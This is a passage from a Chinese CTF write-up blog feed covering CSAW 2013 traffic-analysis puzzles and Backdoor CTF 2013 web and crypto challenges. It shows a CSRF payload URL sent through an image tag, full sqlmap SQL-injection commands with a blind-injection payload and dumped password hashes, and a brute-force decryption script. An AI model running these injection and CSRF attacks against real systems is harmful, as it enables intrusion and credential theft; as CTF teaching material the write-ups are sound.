class="line">flag&#123;f9b43c9e9c05be5e08ea163007af5144&#125;.exe</div><div class="line">flag&#123;f9b43c9e9c05be5e08ea163007af5144&#125;.exe</div><div class="line">flag&#123;f9b43c9e9c05be5e08ea163007af5144&#125;.exe	</div><div class="line">flag&#123;f9b43c9e9c05be5e08ea163007af5144&#125;.exe</div><div class="line">flag&#123;f9b43c9e9c05be5e08ea163007af5144&#125;.exe</div><div class="line">flag&#123;f9b43c9e9c05be5e08ea163007af5144&#125;.exe</div><div class="line">flag&#123;f9b43c9e9c05be5e08ea163007af5144&#125;.exe</div><div class="line">flag&#123;f9b43c9e9c05be5e08ea163007af5144&#125;.exe</div><div class="line">flag&#123;f9b43c9e9c05be5e08ea163007af5144&#125;.exe</div><div class="line">flag&#123;f9b43c9e9c05be5e08ea163007af5144&#125;.exe</div><div class="line">flag&#123;f9b43c9e9c05be5e08ea163007af5144&#125;.exe</div><div class="line">flag&#123;f9b43c9e9c05be5e08ea163007af5144&#125;.exe</div><div class="line">flag&#123;f9b43c9e9c05be5e08ea163007af5144&#125;.exe</div><div class="line">flag&#123;f9b43c9e9c05be5e08ea163007af5144&#125;.exe</div><div class="line">flag&#123;f9b43c9e9c05be5e08ea163007af5144&#125;.exe</div><div class="line">flag&#123;f9b43c9e9c05be5e08ea163007af5144&#125;.exe</div><div class="line">flag&#123;f9b43c9e9c05be5e08ea163007af5144&#125;.exe</div><div class="line">flag&#123;f9b43c9e9c05be5e08ea163007af5144&#125;.exe</div><div class="line">flag&#123;f9b43c9e9c05be5e08ea163007af5144&#125;.exe</div><div class="line">flag&#123;f9b43c9e9c05be5e08ea163007af5144&#125;.exe</div><div class="line">flag&#123;f9b43c9e9c05be5e08ea163007af5144&#125;.exe</div><div class="line">flag&#123;f9b43c9e9c05be5e08ea163007af5144&#125;.exe!</div><div class="line">flag&#123;f9b43c9e9c05be5e08ea163007af5144&#125;.exe"</div><div class="line">flag&#123;f9b43c9e9c05be5e08ea163007af5144&#125;.exe$</div><div class="line">flag&#123;f9b43c9e9c05be5e08ea163007af5144&#125;.exe%</div><div class="line">flag&#123;f9b43c9e9c05be5e08ea163007af5144&#125;.exe'</div><div class="line">flag&#123;f9b43c9e9c05be5e08ea163007af5144&#125;.exe(</div><div class="line">flag&#123;f9b43c9e9c05be5e08ea163007af5144&#125;.exe*</div><div class="line">flag&#123;f9b43c9e9c05be5e08ea163007af5144&#125;.exe+</div><div class="line">flag&#123;f9b43c9e9c05be5e08ea163007af5144&#125;.exe-</div><div class="line">flag&#123;f9b43c9e9c05be5e08ea163007af5144&#125;.exe/</div><div class="line">flag&#123;f9b43c9e9c05be5e08ea163007af5144&#125;.exe0</div><div class="line">flag&#123;f9b43c9e9c05be5e08ea163007af5144&#125;.exe1</div><div class="line">flag&#123;f9b43c9e9c05be5e08ea163007af5144&#125;.exe2</div><div class="line">flag&#123;f9b43c9e9c05be5e08ea163007af5144&#125;.exe3</div><div class="line">flag&#123;f9b43c9e9c05be5e08ea163007af5144&#125;.exe5</div><div class="line">flag&#123;f9b43c9e9c05be5e08ea163007af5144&#125;.exe7</div><div class="line">flag&#123;f9b43c9e9c05be5e08ea163007af5144&#125;.exe8</div><div class="line">flag&#123;f9b43c9e9c05be5e08ea163007af5144&#125;.exe:</div><div class="line">flag&#123;f9b43c9e9c05be5e08ea163007af5144&#125;.exe;</div><div class="line">flag&#123;f9b43c9e9c05be5e08ea163007af5144&#125;.exe&lt;</div><div class="line">flag&#123;f9b43c9e9c05be5e08ea163007af5144&#125;.exe=</div><div class="line">flag&#123;f9b43c9e9c05be5e08ea163007af5144&#125;.exe?</div><div class="line">flag&#123;f9b43c9e9c05be5e08ea163007af5144&#125;.exe</div></pre></td></tr></table></figure><p>提交最终flag：flag{f9b43c9e9c05be5e08ea163007af5144}</p>]]></content>
      
        <categories>
            
            <category> CTF </category>
            
        </categories>
        
        
        <tags>
            
            <tag> ctf </tag>
            
            <tag> misc </tag>
            
            <tag> csaw ctf qualification round 2013 </tag>
            
            <tag> miscellaneous </tag>
            
            <tag> 流量分析 </tag>
            
            <tag> traffic analysis </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[CSAW CTF Qualification Round 2013 Misc 50 Networking 1]]></title>
      <url>/2016/08/16/CSAW-CTF-Qualification-Round-2013--Misc-50-Networking-1/</url>
      <content type="html"><![CDATA[<h2 id="0x00-题目"><a href="#0x00-题目" class="headerlink" title="0x00 题目"></a>0x00 题目</h2><blockquote><p><a href="https://github.com/ctfs/write-ups-2013/blob/master/csaw-quals-2013/misc/network1-50/networking.pcap" target="_blank" rel="external">networking.pcap</a></p></blockquote><h2 id="0x01-解题"><a href="#0x01-解题" class="headerlink" title="0x01 解题"></a>0x01 解题</h2><p>看到题目就想到应该是流量分析的题目类型，分值较低的一般都是在pcap文件中找出flag，主要考查我们流量分析和快速筛选信息的能力，我们既可以使用工具也可以使用命令：</p><a id="more"></a><p>1.使用WireShark打开pcap文件，从图中可以分析看出，这主要是通过telnet(teletype network)登陆传输数据的过程，我们知道telnet协议是TCP/IP协议族中的一员，是Internet远程登陆服务的标准协议和主要方式，基于传输层的TCP协议且通过telnet协议实现的传输的所有数据都是明文形式，包括用户名和密码，利用这一特性我们可以直接跟踪TCP数据流：</p><p><img src="https://www.hackfun.org/usr/uploads/2016/08/2080649939.gif" alt="CSAW CTF Qualification Round 2013 Misc 50 Networking 1.gif"></p><p>2.根据做题经验也可以直接在WireShark直接查找flag相关字符:</p><p><img src="https://www.hackfun.org/usr/uploads/2016/08/1713822766.gif" alt="CSAW CTF Qualification Round 2013 Misc 50 Networking 1.2.gif"></p><p>3.或者在linux上直接使用命令:<br></p><figure class="highlight py"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">root@kali:~<span class="comment"># file networking.pcap</span></div><div class="line">networking.pcap: tcpdump capture file (little-endian) - version <span class="number">2.4</span> (Ethernet, capture length <span class="number">65535</span>)</div></pre></td></tr></table></figure><p></p><figure class="highlight py"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">root@kali:~<span class="comment"># grep -aEi 'ctf|flag|key' networking.pcap</span></div></pre></td></tr></table></figure><p>或者:<br></p><figure class="highlight py"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">root@kali:~<span class="comment"># strings -a networking.pcap</span></div><div class="line">strings networking.pcap</div><div class="line"><span class="number">38400</span>,<span class="number">38400</span></div><div class="line">XTERM</div><div class="line">Ubuntu <span class="number">12.04</span><span class="number">.2</span> LTS</div><div class="line">hockeyinjune-virtual-machine login:</div><div class="line">Password:</div><div class="line">flag&#123;d316759c281bf925d600be698a4973d5&#125;</div><div class="line">Login incorrect</div><div class="line">hockeyinjune-virtual-machine login:</div></pre></td></tr></table></figure><p></p>]]></content>
      
        <categories>
            
            <category> CTF </category>
            
        </categories>
        
        
        <tags>
            
            <tag> ctf </tag>
            
            <tag> misc </tag>
            
            <tag> csaw ctf qualification round 2013 </tag>
            
            <tag> miscellaneous </tag>
            
            <tag> 流量分析 </tag>
            
            <tag> traffic analysis </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Backdoor CTF 2013 Web 300]]></title>
      <url>/2016/08/13/Backdoor-CTF-2013-Web-300/</url>
      <content type="html"><![CDATA[<h2 id="0x00-题目"><a href="#0x00-题目" class="headerlink" title="0x00 题目"></a>0x00 题目</h2><blockquote><p>H4x0r的网站系统需要积分，为你账号获得<a href="http://backdoor-problems.cognizance.org.in/web300/web300.php" target="_blank" rel="external">积分</a>从而获取flag，你可以审计一波网站系统<a href="https://github.com/backdoor-ctf/web300" target="_blank" rel="external">源代码</a>。<br>提示:管理员有一堆积分，就看你能不能用了。</p></blockquote><h2 id="0x01-解题"><a href="#0x01-解题" class="headerlink" title="0x01 解题"></a>0x01 解题</h2><a id="more"></a><p>下载源代码，页面不是很多，简单从主页顺着理了一下网站功能实现，初始注册登陆之后积分为0，注意到：<br></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">if</span>(@$_SESSION[<span class="string">'flash'</span>])</div><div class="line">&#123;</div><div class="line">  <span class="keyword">echo</span> $_SESSION[<span class="string">'flash'</span>];</div><div class="line">  <span class="keyword">unset</span>($_SESSION[<span class="string">'flash'</span>]);</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span></div><div class="line">&#123;</div><div class="line">  <span class="keyword">echo</span> <span class="string">"Welcome to Miracle. You have "</span>.$_SESSION[<span class="string">'credits'</span>].<span class="string">" credits"</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'credits'</span>]&gt;<span class="number">0</span>)</div><div class="line">  <span class="keyword">echo</span> <span class="string">"&lt;br&gt; Congrats, the flag is "</span>.$flag;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p></p><p>只要帐户积分大于0就可以得到flag，而网站有为其他帐户送积分和发送图片链接的功能:<br></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//sendcredits.php</span></div><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">require</span>(<span class="string">'secure.php'</span>);</div><div class="line">$username=$db-&gt;escape_string($_GET[<span class="string">'username'</span>]);</div><div class="line">$credits=(int)$db-&gt;escape_string($_GET[<span class="string">'credits'</span>]);</div><div class="line"></div><div class="line"><span class="comment">//Credits has to be a positive integer</span></div><div class="line"><span class="keyword">if</span>(!is_integer($credits) || $credits&lt;<span class="number">0</span>)</div><div class="line">&#123;</div><div class="line">	header(<span class="string">"Location: error.php?error=ic"</span>);</div><div class="line">	<span class="keyword">exit</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span>($credis&gt;<span class="number">10</span>)</div><div class="line">&#123;</div><div class="line">	<span class="comment">//You can't transfer more than 10 credits.</span></div><div class="line">	header(<span class="string">"Location: error.php?error=tc"</span>);</div><div class="line">	<span class="keyword">exit</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span>($_SESSION[<span class="string">'credits'</span>]&gt;$credits)</div><div class="line">&#123;</div><div class="line">	<span class="comment">//Transfer credits</span></div><div class="line">	$db-&gt;query(<span class="string">"UPDATE users SET credits=credits+$credits WHERE username='$username'"</span>);</div><div class="line">	$result=$db-&gt;query(<span class="string">"UPDATE users SET credits=credits-$credits WHERE username='&#123;$_SESSION['username']&#125;'"</span>);</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span></div><div class="line">&#123;</div><div class="line">	<span class="comment">//Not enough credits</span></div><div class="line">	header(<span class="string">"Location: error.php?error=nc"</span>);</div><div class="line">	<span class="keyword">exit</span>;</div><div class="line">&#125;</div><div class="line"><span class="keyword">if</span>($result)</div><div class="line">&#123;</div><div class="line">	$_SESSION[<span class="string">'flash'</span>]=<span class="string">"Credits Sent Successfully"</span>;</div><div class="line">	header(<span class="string">"Location: index.php"</span>);</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span></div><div class="line">	header(<span class="string">"Location: error.php?error=im"</span>);</div></pre></td></tr></table></figure><p></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//sendimage.php</span></div><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="keyword">require</span>(<span class="string">'secure.php'</span>);</div><div class="line">$username=$db-&gt;escape_string($_POST[<span class="string">'username'</span>]);</div><div class="line">$url=strip_tags($db-&gt;escape_string($_POST[<span class="string">'img_url'</span>]));</div><div class="line"><span class="keyword">if</span> (filter_var($url, FILTER_VALIDATE_URL) === <span class="keyword">FALSE</span>) &#123;</div><div class="line">    header(<span class="string">'Location: error.php?error=wa'</span>);</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span>&#123;</div><div class="line">	$result=$db-&gt;query(<span class="string">"INSERT INTO images VALUES ('$username','$url')"</span>);</div><div class="line">	<span class="keyword">if</span>($result)</div><div class="line">	&#123;</div><div class="line">		$_SESSION[<span class="string">'flash'</span>]=<span class="string">"Image Sent Successfully"</span>;</div><div class="line">		header(<span class="string">"Location: index.php"</span>);</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">else</span></div><div class="line">		header(<span class="string">"Location: error.php?error=im"</span>);</div><div class="line">&#125;</div></pre></td></tr></table></figure><p>个人登陆主页后显示别的用户发送的图片链接：<br></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="comment">//login_form.html</span></div><div class="line">&lt;div class="span12"&gt;</div><div class="line">  &lt;h2&gt;Images sent to you &lt;/h2&gt;</div><div class="line">  <span class="meta">&lt;?php</span></div><div class="line">  <span class="keyword">while</span>($row=$images-&gt;fetch_assoc())</div><div class="line">  &#123;</div><div class="line">	<span class="keyword">echo</span> <span class="string">"&lt;img src='&#123;$row['url']&#125;'&gt;&lt;br&gt;"</span>;</div><div class="line">  &#125;</div><div class="line">  <span class="meta">?&gt;</span></div><div class="line">&lt;/div&gt;</div></pre></td></tr></table></figure><p></p><p>根据提示，再从代码可以看出，用户操作积分时没有taken且对别人传来url完全信任，没有做任何检测，所以这题代码审计主要考查CSRF，只要我们精心构造一个url，类似:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://backdoor-problems.cognizance.org.in/web300/sendcredits.php?credits=1&amp;username=OUR_USERNAME</div></pre></td></tr></table></figure><p>OUR_USERNAME为自己帐户名，通过发送图片链接功能发送给admin，当管理员登陆主页后，浏览器会主动访问发送过来的”链接”，从而执行我们的payload，那么我们帐户便会增加积分。</p><p>结果:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Welcome to Miracle. You have 1 credits</div><div class="line">Congrats, the flag is d50ccf35a71566b5269d9a6896547a28</div></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> CTF </category>
            
        </categories>
        
        
        <tags>
            
            <tag> ctf </tag>
            
            <tag> backdoor ctf 2013 </tag>
            
            <tag> web </tag>
            
            <tag> 代码审计 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Backdoor CTF 2013 Web 500]]></title>
      <url>/2016/08/13/Backdoor-CTF-2013-Web-500/</url>
      <content type="html"><![CDATA[<h2 id="0x00-题目"><a href="#0x00-题目" class="headerlink" title="0x00 题目"></a>0x00 题目</h2><blockquote><p>有人提醒了H4x0r他的Web150新闻网站存在漏洞，所以H4x0r加固了网站。你现在需要找到<a href="http://hack.bckdr.in/2013-WEB-500/web500.php" target="_blank" rel="external">网站</a>管理用户的密码散列从而得到flag。</p></blockquote><a id="more"></a><h2 id="0x01-解题"><a href="#0x01-解题" class="headerlink" title="0x01 解题"></a>0x01 解题</h2><p>这题和Web 150类似，只不过这题是基于布尔型的盲注，直接上sqlmap神器:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python sqlmap.py -u http://hack.bckdr.in/2013-WEB-500/submit.php --data id=1 -p id --threads 10</div></pre></td></tr></table></figure><p>返回结果:<br></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">---</div><div class="line">Parameter: id (POST)</div><div class="line">    Type: boolean-based blind</div><div class="line">    Title: AND boolean-based blind - WHERE or HAVING clause</div><div class="line">    Payload: id=1' AND 3770=3770 AND 'wNSD'='wNSD</div><div class="line">---</div><div class="line">...</div><div class="line">web server operating system: Linux Ubuntu</div><div class="line">web application technology: Apache 2.4.7, PHP 5.5.9</div><div class="line">back-end DBMS: SQLite</div></pre></td></tr></table></figure><p></p><p>获取表段：<br></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">python sqlmap.py -u http://hack.bckdr.in/2013-WEB-500/submit.php --data id=1 -p id --dbms=SQLite --technique B  --threads 10 --tables</div><div class="line"></div><div class="line">...</div><div class="line"></div><div class="line">Database: SQLite_masterdb</div><div class="line">[2 tables]</div><div class="line">+-------+</div><div class="line">| data  |</div><div class="line">| users |</div><div class="line">+-------+</div></pre></td></tr></table></figure><p></p><p>获取users表内容:<br></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div></pre></td><td class="code"><pre><div class="line">python sqlmap.py -u http://hack.bckdr.in/2013-WEB-500/submit.php --data id=1 -p id --dbms=SQLite --technique B  --threads 10 -T users --columns</div><div class="line"></div><div class="line">...</div><div class="line"></div><div class="line">Database: SQLite_masterdb</div><div class="line">Table: users</div><div class="line">[3 columns]</div><div class="line">+----------+---------+</div><div class="line">| Column   | Type    |</div><div class="line">+----------+---------+</div><div class="line">| id       | INTEGER |</div><div class="line">| name     | TEXT    |</div><div class="line">| password | TEXT    |</div><div class="line">+----------+---------+</div></pre></td></tr></table></figure><p></p><p>获取name，password字段内容，得到flag:<br></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">python sqlmap.py -u http://hack.bckdr.in/2013-WEB-500/submit.php --data id=1 -p id --dbms=SQLite --technique B  --threads 10 -T users -C name,password --dump</div><div class="line"></div><div class="line">...</div><div class="line"></div><div class="line">Database: SQLite_masterdb</div><div class="line">Table: users</div><div class="line">[2 entries]</div><div class="line">+----+-------+-----------------------------------------------+</div><div class="line">| id | name  | password                                      |</div><div class="line">+----+-------+-----------------------------------------------+</div><div class="line">| 1  | john  | 1f3870be274f6c49b3e31a0c6728957f (apple)      |</div><div class="line">| 2  | admin | 1d5920f4b44b27a802bd77c4f0536f5a (google.com) |</div><div class="line">+----+-------+-----------------------------------------------+</div></pre></td></tr></table></figure><p></p>]]></content>
      
        <categories>
            
            <category> CTF </category>
            
        </categories>
        
        
        <tags>
            
            <tag> ctf </tag>
            
            <tag> backdoor ctf 2013 </tag>
            
            <tag> web </tag>
            
            <tag> data </tag>
            
            <tag> sqlmap </tag>
            
            <tag> 布尔型盲注 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Backdoor CTF 2013 Web 200]]></title>
      <url>/2016/08/13/Backdoor-CTF-2013-Web-200/</url>
      <content type="html"><![CDATA[<h2 id="0x00-题目"><a href="#0x00-题目" class="headerlink" title="0x00 题目"></a>0x00 题目</h2><blockquote><p>H4x0r在某个地方藏了一个flag，找到<a href="http://backdoor-problems.cognizance.org.in/web200/web.php" target="_blank" rel="external">flag</a>。</p></blockquote><h2 id="0x01-解题"><a href="#0x01-解题" class="headerlink" title="0x01 解题"></a>0x01 解题</h2><p>post的q参数没有过滤处理:<br></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sqlmap.py -u http://backdoor-problems.cognizance.org.in/web200/submit.php --data q=a -p q --threads 10</div></pre></td></tr></table></figure><p></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sqlmap.py -u http://backdoor-problems.cognizance.org.in/web200/submit.php --data q=a -p q --threads 10 --tables</div></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">sqlmap.py -u http://backdoor-problems.cognizance.org.in/web200/submit.php --data q=a -p q --threads 10 --sql-query="select * from flags"</div></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> CTF </category>
            
        </categories>
        
        
        <tags>
            
            <tag> ctf </tag>
            
            <tag> backdoor ctf 2013 </tag>
            
            <tag> web </tag>
            
            <tag> data </tag>
            
            <tag> sqlmap </tag>
            
            <tag> post注入 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Backdoor CTF 2013 Crypto 400]]></title>
      <url>/2016/08/12/Backdoor-CTF-2013-Crypto-400/</url>
      <content type="html"><![CDATA[<h2 id="0x00-题目"><a href="#0x00-题目" class="headerlink" title="0x00 题目"></a>0x00 题目</h2><blockquote><p>现在,这里有个公开的挑战，h4x0r创造了他自己的加密算法,决定向世界上所有的黑客发起挑战。他已经在<a href="http://hack.bckdr.in/2013-CRYPTO-400/code.txt" target="_blank" rel="external">这里</a>公布了加密代码，他向你发起挑战，如果成功破解已加密的文本，承诺会给你丰厚的奖励。不要想得太复杂，已经给了提示，加密只是字母数字方式的。<br>使用上述加密算法之后的加密文本是:168 232 100 162 135 179 112 100 173 206 106 123 106 195 179 157 123 173<br>Flag就是文本信息的MD5值。<br>提示:有时候最直接的方法往往接近答案。</p></blockquote><a id="more"></a><h2 id="0x01-解题"><a href="#0x01-解题" class="headerlink" title="0x01 解题"></a>0x01 解题</h2><p>打开链接，简单分析一下代码：<br></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="comment">// h4x0r的终极加密算法</span></div><div class="line"><span class="comment">// 将要加密的明文字符串</span></div><div class="line">$str = <span class="string">'samplestring'</span>;</div><div class="line"></div><div class="line"><span class="comment">// 将明文字符串转换成对应的ASCII码值</span></div><div class="line"><span class="keyword">for</span> ($i = <span class="number">0</span>; $i&lt;strlen($str); $i++)</div><div class="line">   $dec_array[] = ord($str&#123;$i&#125;);</div><div class="line">$ar = $dec_array; </div><div class="line">$max = max($ar); <span class="comment">//取ASCII码值数组中的最大值</span></div><div class="line"></div><div class="line"><span class="comment">// 在10到max生成一个随机数作为key</span></div><div class="line"><span class="comment">// 所以每次key都不一样</span></div><div class="line">$key = rand(<span class="number">10</span>,$max);</div><div class="line"></div><div class="line"><span class="comment">// key乘以101来增加复杂度</span></div><div class="line">$key = <span class="number">101</span>*$key;</div><div class="line"></div><div class="line"><span class="comment">// 使用以下算法和key来实现加密</span></div><div class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;strlen($str);$i++) <span class="comment">// 循环加密处理,一次加密一个ASCII值</span></div><div class="line">&#123;</div><div class="line">	$x = $ar[$i];</div><div class="line">	$am = ($key+$x)/<span class="number">2</span>;</div><div class="line">	$gm = sqrt($key*$x);</div><div class="line">	$enc = $am + $gm;</div><div class="line">	$encrypt = floor($enc)%<span class="number">255</span>; <span class="comment">// 这是最终加密出的数字结果</span></div><div class="line">	<span class="keyword">echo</span> $encrypt.<span class="string">' '</span>;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p></p><p>通过分析我们发现其实这个加密算法的弱点就是key的生成，虽然每次加密的key都是随机生成，但是key的生成范围较小，可以用穷举法来破译密文，为什么呢，我们来分析一下原因，我们先看ASCII表。</p><p><img src="https://www.hackfun.org/usr/uploads/2016/08/1516512312.jpg" alt="ASCII表.jpg"></p><p>key既然是在10在由待加密的字符串转ASCII码值数组中最大值生成，且题目已经说了是字母数字方式的加密(实质就是字母随机映射数字)，那么在此题中ASCII码值的范围就是65-90和97-122，也就是说key值是在10到122中生成的。那么问题就简单了，我们可以大致算一下破译密文需要穷举次数:18(密文长度)x(122-65+1(明文ACSII取值范围))x(127-10+1(key的取值范围))=123192，这个次数对现在的CPU来说就是1，2秒不到的时间，所以能很轻松破译密文。</p><p>下面是参考的破译代码：<br></p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"></div><div class="line">$cipher = <span class="keyword">array</span>(<span class="number">168</span>, <span class="number">232</span>, <span class="number">100</span> ,<span class="number">162</span>, <span class="number">135</span>, <span class="number">179</span>, <span class="number">112</span>, <span class="number">100</span>, <span class="number">173</span>, <span class="number">206</span>, <span class="number">106</span>, <span class="number">123</span>, <span class="number">106</span>, <span class="number">195</span>, <span class="number">179</span>, <span class="number">157</span>, <span class="number">123</span>, <span class="number">173</span>);</div><div class="line"></div><div class="line"><span class="keyword">for</span>($key=<span class="number">10</span>; $key&lt;=<span class="number">122</span>; $key++)&#123;   <span class="comment">//key的取值范围</span></div><div class="line">	$plain = <span class="keyword">array</span>();</div><div class="line">	$key_new = $key * <span class="number">101</span>;</div><div class="line">	<span class="keyword">for</span>($i=<span class="number">0</span>; $i&lt;count($cipher); $i++)&#123;  <span class="comment">//循环破译密文  </span></div><div class="line">		<span class="keyword">for</span>($p=<span class="number">65</span>; $p&lt;=<span class="number">122</span>; $p++)&#123;   <span class="comment">//明文字符生成的ASCII码范围</span></div><div class="line">			$x = $p;</div><div class="line">			$am = ($key_new+$x)/<span class="number">2</span>;</div><div class="line">			$gm = sqrt($key_new*$x);</div><div class="line">			$enc = $am + $gm;</div><div class="line">			$encrypt = floor($enc)%<span class="number">255</span>;</div><div class="line">			<span class="comment">//判断每次穷举与密文ASCII值是否相等</span></div><div class="line">			<span class="keyword">if</span>($encrypt == $cipher[$i])</div><div class="line">				array_push($plain,$p);    </div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line">	<span class="comment">//将明文ASCII值转为字符</span></div><div class="line">	<span class="keyword">if</span>(count($plain) == count($cipher))&#123;</div><div class="line">		$text = <span class="string">''</span>;</div><div class="line">		<span class="keyword">foreach</span>($plain <span class="keyword">as</span> $t)</div><div class="line">			$text = $text.chr($t);</div><div class="line">		<span class="keyword">echo</span> $text.<span class="string">"\n"</span>;</div><div class="line">	&#125;    </div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure><p></p><p>最终破译的结果:</p><p><img src="https://www.hackfun.org/usr/uploads/2016/08/1721396530.gif" alt="Backdoor CTF 2013 Crypto 400 result.gif"></p><p>计算出MD5值<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">root@kali:~<span class="comment"># echo -n myalgocantbebroken | md5sum</span></div><div class="line">e5f948edd0a2c79d3ab1d13d7948f04a  -</div></pre></td></tr></table></figure><p></p><p>另外提供一篇通过计算密钥key来破译密文的<a href="https://ashishchaudhary.in/2013-CRYPTO-400" target="_blank" rel="external">文章</a>，感兴趣的小伙伴可以去研究一下:P</p>]]></content>
      
        <categories>
            
            <category> CTF </category>
            
        </categories>
        
        
        <tags>
            
            <tag> ctf </tag>
            
            <tag> 穷举法 </tag>
            
